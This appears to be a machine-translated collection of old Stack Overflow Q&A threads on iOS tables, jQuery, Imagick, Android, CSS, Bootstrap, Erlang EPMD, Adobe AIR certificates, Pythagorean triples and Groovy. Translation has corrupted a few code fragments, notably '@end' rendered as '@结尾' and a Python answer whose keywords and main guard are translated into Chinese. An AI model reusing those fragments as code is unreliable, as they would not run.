**Plain** 的标准尺寸`UITableVIewCell`是**320 x 44**，而**Grouped**单元格大约是**300 x 44**（边框在**10**的任一侧）。您可以将其更改为您想要的任何内容，因为这完全取决于您的内容和开发人员对您希望如何呈现视图的偏好。

通常，如果您没有对 tableView 做任何花哨的事情（即它将填满整个屏幕），您可以完全跳过调整单元格或表格的大小。

# ios - 嵌入到 UIViewController 中的 UITableView 中的方法“tableView:didSelectedRowAtIndexPath”

> ID：13756454
> 
> 赞同：0
> 
> 时间：2012-12-07T03:22:52.130
> 
> 标签：ios, uitableview

我已经`UITableView`嵌入到了`UIViewController`，我已经按照在表格视图中显示列表所需的所有步骤进行操作

我对以下方法有疑问，它看起来像被调用但它返回`null`而不是列表中的项目

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSLog(@"%@",[self.list objectAtIndex:indexPath.row]);
} 
```

感谢大家的想法

亚历山德罗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T13:47:46.813

在代码下方，列表正确显示，因此设置了出口和协议方法（委托，数据源）。

方法 tableview:didSelectRowAtIndexPath: 它打印出 (null) 而不是列表中的正确元素

```
//
//  MainViewController.m
//  ProvaTable
//
//  Created by Alessandro on 12/6/12.
//  Copyright (c) 2012 Alessandro. All rights reserved.
//

#import "MainViewController.h"

@interface MainViewController ()
@property (weak, nonatomic) IBOutlet UITableView *tableView;
@property (weak, nonatomic) NSArray *listOfObjects;

@end

@implementation MainViewController

@synthesize tableView = _tableView;
@synthesize listOfObjects = _listOfObjects;

-(void)viewDidLoad
{
    [super viewDidLoad];
// Do any additional setup after loading the view.
    self.listOfObjects = [NSArray arrayWithObjects:@"Object 1",@"Object 2", nil];
}

-(NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

-(NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [self.listOfObjects count];
}

-(UITableViewCell*)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell Item";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
    }
    // Set up the cell...
    cell.textLabel.font = [UIFont fontWithName:@"Helvetica" size:15];
    cell.textLabel.text = [self.listOfObjects objectAtIndex:indexPath.row];
    return cell;
}

-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSLog(@"%@",[self.listOfObjects objectAtIndex:indexPath.row]);
} 
```

@结尾

# javascript - jQuery - 当您将鼠标悬停在其子导航上时，主导航的底部黄色栏失去焦点

> ID：13756455
> 
> 赞同：0
> 
> 时间：2012-12-07T03:22:53.183
> 
> 标签：javascript, jquery, html, css

**示例：http:** [//jtstratford.advisorproducts.com/about](http://jtstratford.advisorproducts.com/about)

当您将鼠标悬停在其子导航上时，主导航的底部黄色栏会失去焦点 - 因此，当您将鼠标悬停在其子导航上时，它将保留在其主导航上。

**下面是JS代码：**

```
// DOM Ready
$(function () {

    var $el, leftPos, newWidth;

    /* Add Magic Line markup via JavaScript, because it ain't gonna work without */
    $("#magicLine").append("<li id='magic-line'></li>");

    /* Cache it */
    var $magicLine = $("#magic-line");

    $magicLine
        .width($(".selectednav").width())
        .css("left", $(".selectednav a").position().left)
        .data("origLeft", $magicLine.position().left)
        .data("origWidth", $magicLine.width());

    $("#magicLine > li").children("a").hover(function () {
        $el = $(this);
        leftPos = $el.position().left;
        newWidth = $el.parent().width();

        $magicLine.stop().animate({
            left: leftPos,
            width: newWidth
        });
    }, function () {
        $magicLine.stop().animate({
            left: $magicLine.data("origLeft"),
            width: $magicLine.data("origWidth")
        });
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:28:23.183

您应该在列表元素而不是子锚点上执行悬停功能。

```
 $("#magicLine > li").hover(function... 
```

这样，当您在同一个列表元素中时，不会触发鼠标移出效果。

# php - 按视觉预期输出每个单独的动画 GIF 帧

> ID：13756459
> 
> 赞同：0
> 
> 时间：2012-12-07T03:23:17.517
> 
> 标签：php, frame, imagick, gmagick

对于某些动画 GIF，对于后续帧，唯一存储的数据是与较早帧相比的差异。现在，我只是触及了（动画）GIF 数据结构的内部工作的表面，但我相信这是通过所谓的压缩、帧差异或处置（实际上并不完全确定）来完成的。

使用 PHP 的 Gmagick 或 Imagick，我如何提取每一帧（写出它们），以便不仅提取最小数据，而且还提取该帧的完整表示，因为它是视觉预期的？

到目前为止，我已经用 Gmagick 尝试了以下方法，但不幸的是：

```
// as per this comment:
// http://php.net/manual/en/imagick.setimagedispose.php#95701
// I've tried values in the range 0-4 here:
$img->setImageDispose( 0 ); // $img is animated GIF instance of Gmagick
$frameIndex = 0;
do
{
    $img->setImageIndex( $frameIndex );
    $frame = $img->getImage();
    $frameName = ++$frameIndex . '.gif';
    $frame->writeImage( $frameName, false ); // or:
    // $frame->write( $frameName );
}
while( $img->hasNextImage() ); 
```

我也尝试了其他一些东西，例如`Gmagick::setImageScene()`，等等。但没有任何效果。我只能保存帧差数据，而不是视觉预期的数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:55:48.320

我自己发现了如何使用 Imagick 做到这一点：

```
$frameIndex = 0;
$img = $img->coalesceImages();
foreach( $img as $frame )
{
    $frameName = ++$frameIndex . '.gif';
    $frame->writeImage( $frameName );
} 
```

换句话说，[`Imagick::coalesceImages()`](http://php.net/manual/en/imagick.coalesceimages.php)成功了。

# android - 我需要在 Android 上提供 xxhdpi 图像吗？

> ID：13756460
> 
> 赞同：2
> 
> 时间：2012-12-07T03:23:18.103
> 
> 标签：android, image, dpi

我正在开发一个主屏幕由许多图标组成的应用程序。我看到有新`1080p phones (HTC Droid DNA)`的可以有密度的`up to 440`，我需要`xxhdpi`在主屏幕上制作一个版本的图标吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T04:19:37.630

我认为您应该关注最流行的屏幕密度，即 hdpi 和 xhdpi，请参阅此[链接](https://developer.android.com/about/dashboards/index.html)了解每种密度的分布。

而且即使你想适应其他密度，你也不需要为这些密度提供所有的drawable。Android会缩放到合适的大小，但是由于android系统的缩放算法必须非常快，一些drawable在缩放后可能会失去质量，你可以专门提供不同密度的drawable。带有纹理的可绘制对象可能很容易丢失质量。

# css - CSS - 透明 png 与 Photoshop 图层类型

> ID：13756461
> 
> 赞同：2
> 
> 时间：2012-12-07T03:23:19.650
> 
> 标签：css, photoshop

我刚刚创建了 Photoshop 模型，所有阴影和高光层都设置为“叠加”而不是“正常”。

在我将它们保存为 .png 并显示在我的网站上之后，它们看起来很糟糕，因为 Photoshop 使用了过滤器而 png/css 没有。

有没有办法修复它？

**我无法将高光保存为带有背景的 .jpg / .png 文件，它需要保存为半透明的 .png 并使用多背景技术放置在背景图像上**。

任何提示/想法？尝试使用不透明/高亮颜色，但仍远非完美。也许有一些CSS方式？

![PS叠加与.png](../Images/fa966e99e7c051501fac0d60cf23df33.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:35:31.893

简短的回答：没有。

长答案：您有两个选择，它们都不涉及在 CSS 中执行此操作：

1.  使用其中一个 JavaScript 插件，该插件将通过一些复杂的计算复制这些函数（一个示例可以在 Vladimir Volek 对原始问题留下的评论中找到： [Is there a way to mimic photoshop's overlay filter with CSS?](https://stackoverflow.com/questions/6587272/is-there-a-way-to-mimic-photoshops-overlay-filter-with-css)）。
2.  通常可以在 Photoshop 中使用不同的（并且更耗时的、逐个案例的方法）重新创建这些效果。我通常会问设计师，如果他们有时间，他/她是否可以回去重新做，如果没有，我会花太多时间自己做。我讨厌将 JS 用于这种愚蠢的表现形式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T03:36:03.217

有一个解决方案，但在 javascript 中。没有办法在css中做到这一点。

[http://web.archive.org/web/20140830094242/https://www.pixastic.com/lib/docs/actions/blend/](http://web.archive.org/web/20140830094242/https://www.pixastic.com/lib/docs/actions/blend/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T03:43:35.700

我遇到了完全相同的问题......我发现这样做的方法是尝试使用不透明度而不是覆盖来重新创建图像。使用上面附加的图像......您可能可以使用渐变工具将颜色从黑色变为透明。将它们应用到新图层，然后将不透明度降低，直到您喜欢为止。然后，您可以删除背景并将其保存为 png。

# html - 在 Bootstrap 中更改悬停效果和字段选择的样式

> ID：13756462
> 
> 赞同：3
> 
> 时间：2012-12-07T03:23:43.103
> 
> 标签：html, css, twitter-bootstrap, hover, less

我正在使用 twitter bootstrap 和我自己的 CSS 来实现一些目标。

我想要做的是，所有输入字段，如用户名、密码和搜索，在选择它们时，边框变为蓝色，我想将其更改为黑色。

另一件事是，我正在使用导航栏逆。它有下拉菜单。当我单击下拉菜单并将鼠标悬停在元素列表上时，默认情况下它是蓝色的。我也在尝试将悬停的东西更改为黑色。我如何实现这一目标？

现在这些是我尝试过的事情。我尝试使用 firebug 元素进行检查，它总是在 bootstrap.min 文件中显示一些内容。但是我找不到任何与悬停相关的东西，而且在过渡方面我有点虚弱，尽管我不确定它是否与过渡有关。我做的另一件事是，我从 variables.less 文件中将值 #08c 编辑为 #000 并编译它并获得一个引导文件，其中包含更改的值但仍然只显示默认颜色。

请帮我实现这些效果。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:08:00.823

首先，我建议不要编辑引导样式表，除非您绝对必须这样做。更好的做法是在您自己的样式表中覆盖特定的引导类（确保您的样式表是网页加载的最后一个）。由于您使用的是 LESS，因此您还可以将引导样式表导入您自己的样式表中，并使用类似的方式加载单个样式表`@import "path/to/bootstrap.min.css"`

要更改下拉菜单中项目的颜色，您可以使用“元素：悬停”作为 CSS 选择器。在引导程序中，我相信它看起来像这样：

```
.dropdown-menu > li > a:hover {
   /* styles */
} 
```

更改“发光”表单的颜色有点复杂，因为它实际上不是边框。我建议您在此处查看有关此效果的简短文章：[http ://www.scriptcult.com/subcategory_97/article_635-glow-on-focus-input-form-fields.html](http://www.scriptcult.com/subcategory_97/article_635-glow-on-focus-input-form-fields.html)

这个 jsfiddle 演示了覆盖默认下拉样式和上面文章中讨论的输入发光：http: [//jsfiddle.net/2UPan/3/](http://jsfiddle.net/2UPan/3/)

我希望这有帮助！

# erlang - Erl 无法连接到本地 EPMD。为什么？

> ID：13756463
> 
> 赞同：3
> 
> 时间：2012-12-07T03:24:00.603
> 
> 标签：erlang, rabbitmq

```
Erlang R14B04 (erts-5.8.5) [source] [64-bit] [rq:1] [async-threads:0 [kernel-poll:false]

Eshell V5.8.5  (abort with ^G)

[root@ip-10-101-61-85 ec2-user]# erl -sname foo
{error_logger,{{2012,12,7},{3,17,8}},"Protocol: ~p: register error: ~p~n",["inet_tcp",{{badmatch,{error,epmd_close}},[{inet_tcp_dist,listen,1},{net_kernel,start_protos,4},{net_kernel,start_protos,3},{net_kernel,init_node,2},{net_kernel,init,1},{gen_server,init_it,6},{proc_lib,init_p_do_apply,3}]}]}
{error_logger,{{2012,12,7},{3,17,8}},crash_report,[[{initial_call,{net_kernel,init,['Argument__1']}},{pid,<0.20.0>},{registered_name,[]},{error_info,{exit,{error,badarg},[{gen_server,init_it,6},{proc_lib,init_p_do_apply,3}]}},{ancestors,[net_sup,kernel_sup,<0.9.0>]},{messages,[]},{links,[#Port<0.55>,<0.17.0>]},{dictionary,[{longnames,false}]},{trap_exit,true},{status,running},{heap_size,377},{stack_size,24},{reductions,453}],[]]}
{error_logger,{{2012,12,7},{3,17,8}},supervisor_report,[{supervisor,{local,net_sup}},{errorContext,start_error},{reason,{'EXIT',nodistribution}},{offender,[{pid,undefined},{name,net_kernel},{mfargs,{net_kernel,start_link,[[foo,shortnames]]}},{restart_type,permanent},{shutdown,2000},{child_type,worker}]}]}
{error_logger,{{2012,12,7},{3,17,8}},supervisor_report,[{supervisor,{local,kernel_sup}},{errorContext,start_error},{reason,shutdown},{offender,[{pid,undefined},{name,net_sup},{mfargs,{erl_distribution,start_link,[]}},{restart_type,permanent},{shutdown,infinity},{child_type,supervisor}]}]}
{error_logger,{{2012,12,7},{3,17,8}},std_info,[{application,kernel},{exited,{shutdown,{kernel,start,[normal,[]]}}},{type,permanent}]}
{"Kernel pid terminated",application_controller,"{application_start_failure,kernel,{shutdown,{kernel,start,[normal,[]]}}}"}

Crash dump was written to: erl_crash.dump
Kernel pid terminated (application_controller) ({application_start_failure,kernel,{shutdown,{kernel,start,[normal,[]]}}}) 
```

我在本地机器上工作正常，但在 Amazon EC2 上却不行，我想知道这是否是一些与网络相关的问题。

我怎样才能检查它？EPMD 日志一直说我的连接来自非本地地址和块。

这会影响我的 RabbitMQ 启动。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-06-14T19:16:29.270

这不是错误。默认情况下，较新的 erlang 版本将与 epmd 的连接限制为本地地址。很可能您遇到了路由问题，或者原因是使用 iptables 伪装所有传出流量，而不检查目的地是否为 127.0.0.0/8。

调整你的 MASQUERADE 规则：

```
iptables -t nat -A POSTROUTING ! -d 127.0.0.0/8 -j MASQUERADE 
```

和/或检查您的路由表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T12:31:33.897

我认为这与您的主机名设置有关。

```
[root@ip-10-101-61-85 ec2-user]# erl -sname foo 
```

根据你上面的shell信息，当前主机名是`"ip-10-101-61-85 ec2-user"`，可能是OS安装程序分配的。尝试重置您的主机名，不要`whitespace`在主机名中使用，然后重试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T03:03:18.967

看来这是 CentOS Ec2 上 erlang R14 或更高版本的错误，我现在在 erlang R13 上工作正常

# php - adobe air 中的证书解码错误

> ID：13756470
> 
> 赞同：1
> 
> 时间：2012-12-07T03:25:00.173
> 
> 标签：php, html, air, adobe

我尝试了很多谷歌搜索但没有答案。我在 adobe air 中创建了一个应用程序，现在想打包它。使用以下命令创建自签名证书时出现错误 - 这是一种格式：

```
adt -certificate -cn name [-ou org_unit][-o org_name][-c country] key_type pfx_file password 
```

我试过这个例子......

1.  `adt -certificate -cn Selfsigned -ou OE -o "Example, co" 1024-RSA SigningCert.p12 39#wnetx3tl`
2.  `adt -certificate -cn ADigitalID 1024-RSA SigningCert.p12 39#wnetx3tl`

两者都返回“证书解码错误”

有人有解决这个问题的方法吗？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-08-27T12:00:44.743

我刚刚遇到了这个错误，我凭直觉通过切换到 2048-RSA 密钥类型克服了这个错误。

```
adt -certificate -cn HelloWorld 2048-RSA certficate.pfx password 
```

# python - 寻找毕达哥拉斯三胞胎

> ID：13756471
> 
> 赞同：3
> 
> 时间：2012-12-07T03:25:04.613
> 
> 标签：python, algorithm

我需要找到毕达哥拉斯三元组的所有“a”和“b”值。例如，我会将数字指定为参数并为其查找所有毕达哥拉斯三元组。这是我的老师给我的一些示例代码：

```
>>> pytriples(5)
>>> [3,4,5] #would return this
>>> pytriples(25)
>>> [7,24,25] #would return this
>>> [15,20,25] #would return this 
```

基本上，我需要编写 pytriples 程序，并且因为没有重复“a”和“b”而获得满分。这就是我开发的 - 问题是，我没有任何方法可以删除重复项。

这就是我所拥有的：

```
def pytriples(c):
    newlist = []
    for a in range(0, c):
        if ((c**2 - a**2)**0.5)%1 == 0:
            b = ((c**2 - a**2)**0.5)
            newlist.append([a,b,c])
    for i in newlist: #this part is supposed to remove the duplicates
        print i[0] #was used for debugging but I could not figure out why duplicates were not removed
        if i[0] >= i[1]:
            newlist.remove(i)
    return newlist 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:37:49.847

不知道这是不是你想要的。。

您可以从三元组的元组列表中删除重复项，例如

考虑到你得到了所有的三胞胎`list l`

```
In [39]: l
Out[39]: [(1, 2, 3), (2, 3, 4), (2, 1, 3)] 
```

要从中删除所有重复项，您可以使用

```
In [40]: set(map(tuple, [sorted(x) for x in l]))
Out[40]: set([(2, 3, 4), (1, 2, 3)]) 
```

然后您可以将其转换为列表以进行进一步处理

```
In [41]: list(set(map(tuple, [sorted(x) for x in l])))
Out[41]: [(2, 3, 4), (1, 2, 3)] 
```

在你的情况下，

修改您在循环中迭代的列表是个坏主意，

因为一旦您删除假设 item1，item2 就会变成 item1，但是循环已经在 list 中迭代 item1，因此将跳过检查并且您将无法获得所需的输出

考虑一个小例子

```
In [43]: l
Out[43]: [(1, 2, 3), (2, 3, 4), (2, 1, 3)]

In [44]: for i in l:
   ....:     if i[0] == 2:
   ....:         l.remove(i)
   ....:

In [45]: l
Out[45]: [(1, 2, 3), (2, 1, 3)] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:46:49.397

Instead of putting duplicates into the array and then using a pass to take them back out, just don't put them into it in the first place. You could change

```
 newlist.append([a,b,c]) 
```

to

```
 if a<b: newlist.append([a,b,c]) 
```

and delete all of the `for i in newlist:` loop and its contents.

(Note, a cannot equal b because sqrt(2) is irrational.)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T04:12:40.097

我宁愿预先计算足够的三元组并尝试找到匹配项，而不是进行全面扫描。如果所有数字都小于给定的数字，我会即时计算更多:)

你的算法有一个正确的想法，但可以更简单地实现。一些基本的三角学完全摆脱了重复。

```
def pytriplets(hypotenuse):
    result = []
    # we only need to check half the triangles,
    # the rest are the same triangles with catheti swapped.
    # 0.71 is approximated sin(pi / 4). Biggest possible catheti are
    # in the isosceles triangle; no bigger should ever be checked. 
    # +1 is because range() excludes the top bound. 
    for a in range(1, int(hypotenuse * 0.71) + 1):
        hypo_squared = hypotenuse * hypotenuse
        a_squared = a * a
        # Square root will give us slight approximation errors;
        # explicitly make our other cathetus integer.
        b = int((hypo_squared  - a_squared) ** 0.5)
        if a_squared + b*b == hypo_squared:
            # A perfect match!
            result.append((hypotenuse, a, b)) # appending a tuple
    return result

print pytriplets(5)
print pytriplets(25) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T03:30:43.223

[应避免](http://docs.python.org/2/tutorial/controlflow.html#for-statements)在迭代列表时修改列表。

可以通过简单的列表推导以您想要的方式删除元素：

```
newlist = [triplet for triplet in newlist if triplet[0] < triplet[1]] 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-02T18:55:11.623

导入数学

def main(): for x in range (1, 1000): for y in range (1, 1000): for z in range(1, 1000): if x*x == y*y + z*z and x +y+z ==1000：打印 y,z,x 打印 '-'*50

如果**名称**== '**主要**': main()

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-07T04:49:53.070

我生成了 c 以下所有完美正方形的列表，并使用来自列表两端的两个指针，我将尝试找到总和为 c^2 的数字对，直到它们交叉为止。

```
def pythogorian_triplets(c):
    c_square = c ** 2
    #list of perfect squares below c_square
    squares = [1]
    #populating the list
    for i in range(1, c - 1):
        squares.append(squares[-1] + (i << 1) + 1)

    i = 0
    j = c - 2
    l = c - 1

    while j >= i and i < l:
        while (squares[i] + squares[j] < c_square) and i < l and j > i:
            i = i + 1
        if squares[i] + squares[j] == c_square:
            print (i + 1, j + 1, c)
        j = j - 1

if __name__ == '__main__':
    pythogorian_triplets(int(raw_input())) 
```

# groovy - Groovy 中的强制混淆

> ID：13756472
> 
> 赞同：0
> 
> 时间：2012-12-07T03:25:10.373
> 
> 标签：groovy

为什么会出现以下

```
class Test {
  @Test
  void go() {
    def foo1 = new MockFoo1() as Foo
    def foo2 = new MockFoo2() as Foo
  }

  interface Foo {}

  class MockFoo1 {}

  class MockFoo2 {}
} 
```

导致`java.lang.IllegalArgumentException: argument type mismatch`对 foo2 的强制？

仅当我在单个执行路径期间将 2 个不同类型的 2 个对象强制到同一接口时，才会发生这种情况。使用闭包或映射来实现这种鸭子类型的常规认可方式效果很好。

任何光线都表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-11T07:14:34.090

这是`ProxyGenerator` `adapterCache`. 作为一种解决方法，您还可以使用一些 Groovy 技巧来完成这项工作：

```
interface Foo {
    static a = {
        [MockFoo1, MockFoo2].each {
            it.metaClass.asType = { Class klazz ->
                try {
                    DefaultGroovyMethods.asType(delegate, klazz)
                } catch (e) {
                    def cache = ProxyGenerator.INSTANCE.@adapterCache.@cache
                    cache.each { k, v ->
                        cache.remove(k)
                    }
                    DefaultGroovyMethods.asType(delegate, klazz)
                }
            }
        }
    }()
}

class MockFoo1 {}
class MockFoo2 {}

def a = new MockFoo1() as Foo
def b = new MockFoo2() as Foo

assert a instanceof Foo
assert b instanceof Foo 
```

希望这可以帮助！

# android - Android ListView 通用图像加载器在滚动时更改图像

> ID：13756474
> 
> 赞同：7
> 
> 时间：2012-12-07T03:26:02.763
> 
> 标签：android, android-listview, universal-image-loader

我有一个问题让我伤心了好几个星期。当我更新到新的 Facebook SDK 时，我有一段时间忘记了它，但现在它又回到了我的梦想中。

我基本上是在做一个 Facebook 订阅阅读器。它从 API 调用中获取 JSON 数据并使用它来填充 ListView。每次自定义适配器调用 getView() 方法时，它都会检查它是什么类型的“状态”。如果是“照片”状态，则视图将有两个图像（个人资料图片和状态更新的图片）。我正在使用 nostra13 的 Universal Image Loader 在使用 holder 类对 ImageView 进行充气后加载两个图像，以帮助回收视图。这就是我认为我的问题存在的地方。

当我滚动浏览列表时，所有个人资料图片都可以正常加载并且效果很好。但是当我滚动时，状态照片会做几件事：

1.）全部加载相同的图像（我以前没有这个问题，但我给自己尝试修复其他图像）。

2.) 图像跳来跳去，要么消失，要么出现在与预期不同的视图中。

3.）如果图像加载正确并且不都显示相同的图像，图像会随着我向上和向下滚动而改变，最终都变成相同的图像。

我会发布我的 getView() 代码（抱歉有点长）。

```
@Override
public View getView(final int position, View convertView, ViewGroup parent) {

    final ViewHolder holder;

    try {
        jsonObject = getItem(position);
        jsonFrom = jsonObject.getJSONObject("from");
        postType = jsonObject.getString("type");
        posterName = jsonFrom.getString("name");
        posterID = jsonFrom.getString("id");
        posterPhoto = "http://graph.facebook.com/" + posterID
                + "/picture?type=square";
        if (jsonObject.has("message")) {
            posterMessage = jsonObject.getString("message");
        } else {
            posterMessage = jsonObject.getString("story");
        }
    } catch (JSONException e) {
        e.printStackTrace();
    }

    if (postType.equals("status")) {
        if (convertView == null) {
            LayoutInflater inflater = (LayoutInflater) activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            convertView = inflater.inflate(R.layout.status_post_holder,null);
            holder = new ViewHolder();
            convertView.setTag(holder);
        } else {
            holder = (ViewHolder) convertView.getTag();
        }

        holder.posterName = (TextView) convertView.findViewById(R.id.posterName);
        holder.posterMessage = (TextView) convertView.findViewById(R.id.posterMessage);
        holder.posterProfilePhoto = (ImageView) convertView.findViewById(R.id.posterProfilePic);

        if (jsonObject != null) {
            holder.posterName.setText(posterName);
            if (posterMessage != null) {
                holder.posterMessage.setText(posterMessage);
            } else {
                holder.posterMessage.setText("No message for this post.");
            }
            profileImageLoader.displayImage(posterPhoto,
                    holder.posterProfilePhoto);
        }

    }

    else if (postType.equals("photo")) {
        if (convertView == null) {
            try {
                posterImageURL = jsonObject.getString("picture");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            LayoutInflater inflater = (LayoutInflater) activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            convertView = inflater.inflate(R.layout.photo_post_holder, null);
            holder = new ViewHolder();
            convertView.setTag(holder);
        } else {
            holder = (ViewHolder) convertView.getTag();
        }

        holder.posterName = (TextView) convertView.findViewById(R.id.posterName);
        holder.posterMessage = (TextView) convertView.findViewById(R.id.posterMessage);
        holder.posterProfilePhoto = (ImageView) convertView.findViewById(R.id.posterProfilePic);
        holder.posterImage = (ImageView) convertView.findViewById(R.id.posterImage);

        if (jsonObject != null) {
            holder.posterName.setText(posterName);
            if (posterPhoto != null) {
                profileImageLoader.displayImage(posterPhoto,holder.posterProfilePhoto);
            }
            if (posterImageURL != null) {
                pictureImageLoader.displayImage(posterImageURL,holder.posterImage);
            }

            if (posterMessage != null) {
                holder.posterMessage.setText(posterMessage);
            } else {
                holder.posterMessage.setText("No message for this post.");
            }
        }

    }

    else if (postType.equals("link")) {
        if (convertView == null) {
            LayoutInflater inflater = (LayoutInflater) activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            convertView = inflater.inflate(R.layout.status_post_holder,null);
            holder = new ViewHolder();
            convertView.setTag(holder);
        } else {
            holder = (ViewHolder) convertView.getTag();
        }

        holder.posterName = (TextView) convertView.findViewById(R.id.posterName);
        holder.posterMessage = (TextView) convertView.findViewById(R.id.posterMessage);
        holder.posterProfilePhoto = (ImageView) convertView.findViewById(R.id.posterProfilePic);

        if (jsonObject != null) {
            holder.posterName.setText(posterName);
            if (posterMessage != null) {
                holder.posterMessage.setText(posterMessage);
            } else {
                holder.posterMessage.setText("No message for this post.");
            }
            profileImageLoader.displayImage(posterPhoto,holder.posterProfilePhoto);
        }
    }

    else {
        if (convertView == null) {
            LayoutInflater inflater = (LayoutInflater) activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            convertView = inflater.inflate(R.layout.status_post_holder,null);
            holder = new ViewHolder();
            convertView.setTag(holder);
        } else {
            holder = (ViewHolder) convertView.getTag();
        }

        holder.posterName = (TextView) convertView.findViewById(R.id.posterName);
        holder.posterMessage = (TextView) convertView.findViewById(R.id.posterMessage);
        holder.posterProfilePhoto = (ImageView) convertView.findViewById(R.id.posterProfilePic);

        if (jsonObject != null) {
            holder.posterName.setText(posterName);
            if (posterMessage != null) {
                holder.posterMessage.setText(postType);
            } else {
                holder.posterMessage.setText("No message for this post.");
            }
            profileImageLoader.displayImage(posterPhoto,holder.posterProfilePhoto);
        }
    }

    return convertView;

} 
```

我确信这与 Android 回收视图和效率有关，但我无法弄清楚我在哪里犯了错误。问题只存在于一个图像视图也很奇怪。任何帮助都会很热。谢谢。

**更新：** 我们发现这是我的 JSON 解析错误。您必须使用 setTag() 来保留特定于该行项目的图像。适配器试图为视图设置一个 null 标记，这导致了 NPE。

**再次更新：**在挖掘了更多之后，看起来是 ImageView 本身给出了一个空值，就好像它没有找到正确的布局一样。我为不同类型的帖子使用了两种不同的 xml 布局。所以现在看起来最好的解决方案是使用相同的布局，并根据状态类型有条件地膨胀每个视图中的不同元素。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T03:41:58.217

在使用和处理图像加载器类时请具体说明。如果可能，不要创建同一类的更多实例。而不是以不同的方式使用相同的实例。

请参阅下面的适配器类并尝试在您的情况下集成相同的。这将对您有所帮助。

```
 private class OrderAdapter extends ArrayAdapter<User> {
        private ArrayList<User> items;
        Activity a;
        public ImageLoader imageLoader;

        public OrderAdapter(Context context, int textViewResourceId,ArrayList<User> items) {
            super(context, textViewResourceId, items);
            this.items = items;
            // extra
            /*if (Utility.model == null) {
                Utility.model = new FriendsGetProfilePics();
            }
            Utility.model.setListener(this);*/
        }

        /*@Override
        public boolean isEmpty() {
            // TODO Auto-generated method stub
            super.isEmpty();
            return false;
        }*/

        @Override
        public View getView(final int position, View convertView,ViewGroup parent) {
            ViewHolder holder;
            View v = convertView;
            if (v == null) {
                LayoutInflater vi = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);

                v = vi.inflate(R.layout.add_buddies_row_new, null);
                holder = new ViewHolder();
                imageLoader = new ImageLoader(NotificationsActivity.this);
                //--------------

                //---------------------------------------------------------------------
                // for head to head
                holder.userName = (TextView) v.findViewById(R.id.txtName);
                holder.userPic = (ImageView) v.findViewById(R.id.imgUserPic);
                holder.userCity = (TextView) v.findViewById(R.id.txtCity);
                holder.userState = (TextView) v.findViewById(R.id.txtstate);
                holder.userCountry = (TextView) v.findViewById(R.id.txtContry);
                //---------------------------------------------------------------------

                v.setTag(holder);

            }else{
                holder=(ViewHolder)v.getTag();
            }

            final User o = items.get(position);
            holder = (ViewHolder) v.getTag();

            if (o != null) {
                holder.userName.setText(o.getUserName());
                holder.userCity.setText(o.getUserCity()+", ");
                holder.userState.setText(o.getUserState()+", ");
                holder.userCountry.setText(o.getUserCountry());
                System.out.println("PIC: "+o.getUserPic());
                holder.userPic.setTag(o.getUserPic());
                imageLoader.DisplayImage(o.getUserPic(), a, holder.userPic);
            }
            return v;
        }
    }

    class ViewHolder {
        TextView userName ;
        TextView userCity;
        TextView userState;
        TextView userCountry;
        ImageView userPic ;
    } 
```

评论我的任何甜甜圈。

注意：您必须根据您的要求对上述代码进行一些更改。

如果您的问题无法解决，请告诉我。

如果您获取空数据也可能发生这种情况，因此请确认获取数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-12T21:50:20.387

我知道自从创建主题以来已经有一段时间了，但是我对@Wenger 的 NPE 的解决方案出现了，因为我在名为 v 而不是 ViewHolder 的 View 成员上使用了 findViewById：

```
holder.userName = (TextView) v.findViewById(R.id.txtName); 
```

工作参考：

```
holder.userName = (TextView) convertView.findViewById(R.id.txtName); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-17T11:31:22.533

我对视图持有者模式和通用图像加载器有同样的问题。

在调用通用加载器显示图像之前，我正在检查我的 url，如果 url 为空，我不会下载图像，只是将 imageview 背景设置为可绘制我没有图像可绘制。在 Listview 滚动上，我的 listview 图像混合在一起。

然后我尝试不检查 url 是否为空，而只是将一个 no url drawable 设置为通用图像加载器显示图像选项。这解决了我的问题。我不知道这是否是解决此问题的常见解决方案，但您可以尝试一下。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-17T12:31:07.760

首先，考虑使用视图类型 - `getViewTypeCount()`& `getItemViewType(int position)`-`ListView`不会尊重您的不同视图 - 更多信息：`ListView`回收如何工作。

